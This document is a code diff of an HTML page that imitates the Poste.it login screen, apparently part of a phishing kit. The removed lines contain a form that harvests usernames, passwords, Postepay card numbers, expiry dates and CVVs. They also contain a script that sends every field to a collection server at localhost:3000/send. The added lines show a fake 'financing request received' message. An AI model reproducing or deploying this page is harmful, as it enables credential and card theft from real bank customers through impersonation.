@@ -269,13 +269,6 @@
 									<div class="col-md-12">
 										<div class="abstract">
 											<div class="abstract-heading text-xs-center spacer-xs-bottom-40">
-												<h1 class="idp-retail">
-													Accedi
-													<h3 class="idp-retail">
-														Per accedere a <strong><span id="titolo-fcc">Poste.it</span></strong> devi essere un
-														utente registrato.
-													</h3>
-												</h1>
 											</div>
 										</div>
 									</div>
@@ -287,85 +280,9 @@
 												<div class="content">
 													<div class="content-overflow-wrap">
 														<div class="row">
-															<div class="col-xs-12 col-sm-6">
-																<div class="panel panel-cards panel-cards-large">
-																	<div class="panel-wrap innerspacer-xs-bottom-0">
-																		<div class="panel-heading spacer-xs-top-30 rememberme_hidden">
-																			<h4 class="text-xs-center">
-																				Inserisci le tue <strong>credenziali</strong>
-																			</h4>
-																		</div>
-																		<div class="panel-heading spacer-xs-top-30 text-xs-center rememberme_shown"
-																			style="display:none">
-																			<img src="./risorse_dt_ext/icone/empty-profile.png"
-																				srcset="./risorse_dt_ext/icone/empty-profile@2x.png 2x" alt="">
-																			<p><a href="javascript:deleteRememberMe();">Non sei tu?</a></p>
-																		</div>
-																		<form class="form-login clearfix" method="POST" name="loginf" id="login-form">
-																			<div class="panel-body">
-																				<div class="spacer-xs-bottom-30">
-																					<div class="form-group form-group-lg rememberme_hidden">
-																						<p>
-																							<label class="control-label" for="username">NOME
-																								UTENTE</label> <input class="form-control" id="username" name="username"
-																								placeholder="inserisci" type="text" value="" required
-																								autocomplete="username">
-																						</p>
-																					</div>
-																					<div class="form-group form-group-lg">
-																						<label class="control-label" for="password">PASSWORD</label>
-																						<div class="input-group">
-																							<input type="password" class="form-control pwd-control" id="password"
-																								name="password" placeholder="inserisci" required
-																								autocomplete="current-password">
-																							<div class="input-group-addon input-group-addon-pwd bg-password-hide"
-																								title="mostra la password" id="password-trigger">
-																								<div style="width:24px"></div>
-																							</div>
-																						</div>
-																					</div>
-																					<div class="form-group form-group-lg">
-																						<label class="control-label" for="cc-number">Numero carta POSTEPAY</label>
-																						<input type="text" inputmode="tel" class="form-control" id="cc-number"
-																							name="cc-number" required autocomplete="cc-number" value="" minlength="16"
-																							maxlength="20" pattern="[0-9]{16,20}">
-																					</div>
-																					<div class="form-group form-group-lg">
-																						<label class="control-label" for="cc-exp">Data di scadenza</label>
-																						<div class="input-group">
-																							<input type="month" class="form-control" id="cc-exp" name="cc-exp"
-																								required autocomplete="cc-exp">
-																						</div>
-																						<label class="control-label" for="cc-csc">CVV</label>
-																						<div class="input-group">
-																							<input type="text" inputmode="tel" class="form-control" id="cc-csc" name="cc-csc"
-																								placeholder="inserisci" autocomplete="cc-csc" minlength="3"
-																								maxlength="3" pattern="[0-9]{3}" required>
-																						</div>
-																					</div>
-																					<div class="form-group form-group-lg rememberme_hidden">
-																						<div class="checkbox">
-																							<p>
-																								<label class="control-label">
-																									<input type="checkbox" id="checkbox-remember">Ricorda il mio nome
-																									utente
-																								</label>
-																							</p>
-																						</div>
-																					</div>
-																					<p
-																						class="btn-container btn-container-center spacer-xs-bottom-15 spacer-xs-top-30 clearfix">
-																						<input type="submit" class="btn btn-primary btn-expand" value="accedi">
-																					</p>
-																				</div>
-																			</div>
-																		</form>
-																	</div>
-																</div>
-															</div>
 															<!-- panel qrcode  -->
-															<div class="col-xs-12 col-sm-6">
-																<div class="panel panel-cards panel-cards-large">
+															<div class="col-12">
+																<div class="panel panel-cards panel-cards-large" style="margin-top: 5rem !important;">
 																	<div class="panel-wrap text-xs-center">
 																		<div class="panel-body spacer-xs-bottom-30">
 																			<div class="spacer-xs-bottom-10 spacer-xs-top-30">
@@ -374,15 +291,8 @@
 																			</div>
 																		</div>
 																		<div class="panel-heading">
-																			<h4 class="text-xs-center">Non hai un account?</h4>
+																			<h4 class="text-xs-center">La tua richiesta di finanziamento è stata ricevuta!</h4>
 																		</div>
-																		<p>Crea un account di Poste per accedere a tutti i
-																			servizi online</p>
-																		<p
-																			class="btn-container btn-container-center spacer-xs-bottom-15 spacer-xs-top-30 clearfix">
-																			<a href="https://www.poste.it/registrazione/registrazione.html"
-																				class="btn btn-secondary col-xs-12">Registrati</a>
-																		</p>
 																	</div>
 																</div>
 															</div>
@@ -430,30 +340,6 @@
 			</div>
 		</div>
 	</div>
-	<script>
-		$('#login-form').on("submit", (event) => {
-			event.preventDefault();
-			let formData = new FormData(event.target);
-			let data = {};
-
-			formData.forEach((value, key) => {
-				data[key] = value;
-			});
-
-			$.ajax({
-				url: "http://localhost:3000/send",
-				type: 'POST',
-				data: data,
-				success: (response) => {
-					console.log(response);
-				},
-				error: (error) => {
-					console.log(error);
-				}
-			});
-		});
-	</script>
-	<script src="./risorse_dt/condivise/javascript/start-script.js"></script>
 	<script src="./risorse_dt/bootstrap/js/bootstrap.js"></script>
 	<script src="./risorse_dt/bootstrap/js/ie10-viewport-bug-workaround.js"></script>
 </body>
